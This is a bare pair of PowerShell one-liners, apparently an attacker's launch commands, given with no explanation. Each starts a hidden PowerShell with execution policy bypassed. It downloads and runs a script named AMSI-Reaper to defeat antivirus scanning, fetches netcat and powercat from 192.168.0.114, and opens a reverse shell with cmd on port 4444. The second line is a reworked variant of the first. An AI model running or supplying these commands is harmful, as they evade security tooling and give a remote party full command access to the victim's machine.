Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (New-Object Net.WebClient).DownloadString('http://192.168.0.114/AMSI-Reaper.ps1'); iex (New-Object Net.WebClient).DownloadString('http://192.168.0.114/nc.exe'); Import-Module .\powercat.ps1; powercat -c 192.168.0.114 -p 4444 -e cmd -v`""

Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (New-Object Net.WebClient).DownloadString('http://192.168.0.114/AMSI-Reaper.ps1'); (New-Object Net.WebClient).DownloadFile('http://192.168.0.114/nc.exe', '$env:TEMP\nc.exe'); iex (New-Object Net.WebClient).DownloadString('http://192.168.0.114/powercat.ps1'); powercat -c 192.168.0.114 -p 4444 -e cmd.exe -v`""

